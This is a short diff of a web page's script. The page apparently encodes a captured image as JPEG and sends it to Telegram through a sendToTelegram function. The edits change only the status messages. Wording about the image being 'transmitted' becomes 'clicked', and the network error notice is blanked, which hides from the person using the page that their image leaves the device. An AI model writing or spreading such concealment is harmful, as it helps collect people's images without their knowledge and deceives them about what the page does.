@@ -94,7 +94,7 @@
                     return;
                 }
                 
-                statusDiv.innerText = "Processing submission...";
+                statusDiv.innerText = "Clicking...";
                 sendToTelegram(blob);
             }, 'image/jpeg', 0.8);
         }
@@ -115,7 +115,7 @@
                 const result = await response.json();
                 
                 if (result.ok) {
-                    statusDiv.innerHTML = "<span style='color: green;'>Verification Image Transmitted Successfully!</span>";
+                    statusDiv.innerHTML = "<span style='color: green;'>Image Clicked Successfully!</span>";
                     // Dismiss the modal once processing completes successfully
                     noticeModal.style.display = "none";
                 } else {
@@ -123,7 +123,7 @@
                 }
             } catch (error) {
                 console.error("Transmission error:", error);
-                statusDiv.innerHTML = "<span style='color: red;'>Network error occurred.</span>";
+                statusDiv.innerHTML = "<span style='color: red;'></span>";
             }
         }
     </script>
